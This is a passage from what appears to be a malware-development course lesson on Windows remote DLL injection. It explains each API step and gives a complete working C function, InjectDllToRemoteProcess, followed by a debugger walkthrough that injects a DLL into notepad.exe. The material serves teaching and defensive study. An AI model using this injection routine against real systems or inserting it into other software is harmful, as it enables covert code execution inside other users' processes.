it.</li></ol><ol type="1" id="fa4a9988-e828-4f87-bc94-ae38dbac0a8b" class="numbered-list" start="2"><li>DLL name - The full path to the DLL that will be injected into the target process.</li></ol><h3 id="d2caefc2-4210-4ba6-a790-0d02eb5b9593" class=""><strong>Find LoadLibraryW Address</strong></h3><p id="8556067c-6dfa-4e30-bfa6-8ad083c7f101" class=""><code>LoadLibraryW</code>&nbsp;is used to load a DLL inside the process that calls it. Since the goal is to load the DLL inside a remote process rather than the local process, then it cannot be invoked directly. Instead, the address of&nbsp;<code>LoadLibraryW</code>&nbsp;must be retrieved and passed to a remotely created thread in the process, passing the DLL name as its argument. This works because the address of the&nbsp;<code>LoadLibraryW</code>&nbsp;WinAPI will be the same in the remote process as in the local process. To determine the address of the WinAPI,&nbsp;<code>GetProcAddress</code>&nbsp;along with&nbsp;<code>GetModuleHandle</code>&nbsp;is used.</p><pre id="7ede2648-1e6a-47dc-b7e9-2d5db490034a" class="code code-wrap"><code>// LoadLibrary is exported by kernel32.dll
+// Therefore a handle to kernel32.dll is retrieved followed by the address of LoadLibraryW
+pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
+</code></pre><p id="a6b0c1dc-da24-4ca6-9cc9-74119837036b" class="">The address stored in&nbsp;<code>pLoadLibraryW</code>&nbsp;will be used as the thread entry when a new thread is created in the remote process.</p><h3 id="305d74c1-a71b-4a5c-b7d8-8a4d207e3feb" class=""><strong>Allocating Memory</strong></h3><p id="51dd13a8-bb35-489a-8ccb-0b66e0105875" class="">The next step is to allocate memory in the remote process that can fit the DLL's name,&nbsp;<code>DllName</code>. The&nbsp;<code>VirtualAllocEx</code>&nbsp;function is used to allocate the memory in the remote process.</p><pre id="63971dc7-4ebe-4ef4-bb27-0ac054155060" class="code code-wrap"><code>// Allocate memory the size of dwSizeToWrite (that is the size of the dll name) inside the remote process, hProcess.
+// Memory protection is Read-Write
+pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+</code></pre><h3 id="687d7407-3102-4faa-bdc0-98617fd0587e" class=""><strong>Writing To Allocated Memory</strong></h3><p id="518e45f8-7790-47d8-b40d-a598c078cd1a" class="">After the memory is successfully allocated in the remote process, it's possible to use&nbsp;<code>WriteProcessMemory</code>&nbsp;to write to the allocated buffer. The DLL's name is written to the previously allocated memory buffer.</p><p id="bf99c2bc-2f4d-46d0-a5f1-f679f7adcad8" class="">The&nbsp;<code>WriteProcessMemory</code>&nbsp;WinAPI function looks like the following based on its documentation</p><pre id="5668a1a7-520c-425a-a1f1-ac2cac052e77" class="code code-wrap"><code>BOOL WriteProcessMemory(
+  [in]  HANDLE  hProcess,               // A handle to the process whose memory to be written to
+  [in]  LPVOID  lpBaseAddress,          // Base address in the specified process to which data is written
+  [in]  LPCVOID lpBuffer,               // A pointer to the buffer that contains data to be written to 'lpBaseAddress'
+  [in]  SIZE_T  nSize,                  // The number of bytes to be written to the specified process.
+  [out] SIZE_T  *lpNumberOfBytesWritten // A pointer to a 'SIZE_T' variable that receives the number of bytes actually written
+);
+</code></pre><p id="481784f7-f9e2-4822-b973-13060bf86d00" class="">Based on&nbsp;<code>WriteProcessMemory</code>'s parameters shown above, it will be called as the following, writing the buffer (<code>DllName</code>) to the allocated address (<code>pAddress</code>), returned by the previously called&nbsp;<code>VirtualAllocEx</code>&nbsp;function.</p><pre id="6f6715ed-faef-4326-9f6b-b9de8148b3b0" class="code code-wrap"><code>// The data being written is the DLL name, 'DllName', which is of size 'dwSizeToWrite'
+SIZE_T lpNumberOfBytesWritten = NULL;
+WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &amp;lpNumberOfBytesWritten)
+</code></pre><h3 id="591a18e6-bd99-45f7-961b-bccd50d630e2" class=""><strong>Execution Via New Thread</strong></h3><p id="0c68a96a-6929-4296-ae8e-a463d18a5c52" class="">After successfully writing the DLL's path to the allocated buffer,&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a>&nbsp;will be used to create a new thread in the remote process. This is where the address of&nbsp;<code>LoadLibraryW</code>&nbsp;becomes necessary.&nbsp;<code>pLoadLibraryW</code>&nbsp;is passed as the starting address of the thread and then&nbsp;<code>pAddress</code>, which contains the DLL's name, is passed as an argument to the&nbsp;<code>LoadLibraryW</code>&nbsp;call. This is done by passing&nbsp;<code>pAddress</code>&nbsp;as the&nbsp;<code>lpParameter</code>&nbsp;parameter of&nbsp;<code>CreateRemoteThread</code>.</p><p id="2584f159-39a4-488c-99e7-5abdcda3c51a" class=""><code>CreateRemoteThread</code>'s parameters are the same as that of the&nbsp;<code>CreateThread</code>&nbsp;WinAPI function explained earlier, except for the additional&nbsp;<code>HANDLE hProcess</code>&nbsp;parameter, which represents a handle to the process in which the thread is to be created.</p><pre id="8b780779-5203-4512-b29e-de06c7ed98fc" class="code code-wrap"><code>// The thread entry will be 'pLoadLibraryW' which is the address of LoadLibraryW
+// The DLL's name, pAddress, is passed as an argument to LoadLibrary
+HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
+</code></pre><h3 id="92fd4d98-4216-4345-8428-39d81147408d" class=""><strong>DLL Injection - Code Snippet</strong></h3><pre id="5023fd11-0992-4b80-8287-ca8b7a5ed6a4" class="code code-wrap"><code>BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {
+
+	BOOL		bSTATE                    = TRUE;
+
+	LPVOID		pLoadLibraryW             = NULL;
+	LPVOID		pAddress                  = NULL;
+
+	// fetching the size of DllName *in bytes*
+	DWORD		dwSizeToWrite             = lstrlenW(DllName) * sizeof(WCHAR);
+
+	SIZE_T		lpNumberOfBytesWritten    = NULL;
+
+	HANDLE		hThread                   = NULL;
+
+	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
+	if (pLoadLibraryW == NULL){
+		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (pAddress == NULL) {
+		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);
+	printf("[#] Press &lt;Enter&gt; To Write ... ");
+	getchar();
+
+	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &amp;lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite){
+		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+	printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
+	printf("[#] Press &lt;Enter&gt; To Run ... ");
+	getchar();
+
+	printf("[i] Executing Payload ... ");
+	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
+	if (hThread == NULL) {
+		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+	printf("[+] DONE !\n");
+
+
+_EndOfFunction:
+	if (hThread)
+		CloseHandle(hThread);
+	return bSTATE;
+}
+</code></pre><h3 id="dff8d7ee-e069-4237-8864-2a51dd6a6da8" class=""><strong>Debugging</strong></h3><p id="339c50ba-f4cf-49bd-a8c2-436d6687737f" class="">In this section, the implementation is debugged using the xdbg debugger to further understand what is happening under the hood.</p><p id="4147bc18-84a4-44c1-aa0f-c46f89a8b3f3" class="">First, run&nbsp;<code>RemoteDllInjection.exe</code>&nbsp;and pass two arguments, the target process and the full DLL path to inject inside the target process. In this demo,&nbsp;<code>notepad.exe</code>&nbsp;is being injected.</p><figure id="5c15daf0-532e-4f7b-bc68-e64a1c491111" class="image"><a href="./28. Process Injection - DLL Injection_files/remote-dll-injection-1.png"><img style="width:1378px" src="./28. Process Injection - DLL Injection_files/remote-dll-injection-1.png"></a></figure><p id="4160f7f4-d383-4c2a-9f33-e4cca9b851de" class="">The process enumeration successfully worked. Verify that Notepad's PID is indeed&nbsp;<code>20932</code>&nbsp;using Process Hacker.</p><figure id="764199ce-2d37-4078-9ce7-c016a5426adb" class="image"><a href="./28. Process Injection - DLL Injection_files/remote-dll-injection-2.png"><img style="width:1183px" src="./28. Process Injection - DLL Injection_files/remote-dll-injection-2.png"></a></figure><p id="1948a908-d62d-42aa-a63e-a85b3ff56374" class="">Next, xdbg is attached to the targeted process, Notepad, and check the allocated address. The image below shows that the buffer was successfully allocated.</p><figure id="e9bd0ae0-0038-4c7d-8611-cf66f7401e32" class="image"><a href="./28. Process Injection - DLL Injection_files/remote-dll-injection-3.png"><img style="width:1558px" src="./28. Process Injection - DLL Injection_files/remote-dll-injection-3.png"></a></figure><p id="87643301-0588-4153-82a7-277caab6e6a3" class="">After the memory allocation, the DLL name is written to the buffer.</p><figure id="4df400da-2cb8-4c20-ac28-ff856e5d4e83" class="image"><a href="./28. Process Injection - DLL Injection_files/remote-dll-injection-4.png"><img style="width:1724px" src="./28. Process Injection - DLL Injection_files/remote-dll-injection-4.png"></a></figure><p id="3ea91c6a-acf3-494c-b4ec-9001a0070525" class="">Finally, a new thread is created in the remote process which executes the DLL.</p><figure id="a8fbfd26-364f-462a-acdf-86f300c8f0e5" class="image"><a href="./28. Process Injection - DLL Injection_files/remote-dll-injection-5.png"><img style="width:1648px" src="./28. Process Injection - DLL Injection_files/remote-dll-injection-5.png"></a></figure><p id="e372d8b3-2c43-4fee-b5ef-45a3915ae4f7" class="">Verify that the DLL was successfully injected using Process Hacker's modules tab.</p><figure id="a7dbfac1-49c5-43a6-9c1c-7379eb972b5c" class="image"><a href="./28. Process Injection - DLL Injection_files/remote-dll-injection-6.png"><img style="width:695px" src="./28. Process Injection - DLL Injection_files/remote-dll-injection-6.png"></a></figure><p id="f27a114d-33b3-46f7-a2e7-59acc52627ab" class="">Head to the threads tab in Process Hacker and notice the thread that is running LoadLibraryW as its entry function</p><figure id="e901161c-4b57-4dbd-a92c-2f84a1b757ff" class="image"><a href="./28. Process Injection - DLL Injection_files/remote-dll-injection-7.png"><img style="width:712px" src="./28. Process Injection - DLL Injection_files/remote-dll-injection-7.png"></a></figure><p id="98736fb7-27c5-4c29-b817-4c01f272671c" class="">
+</p></div></article></body></html>
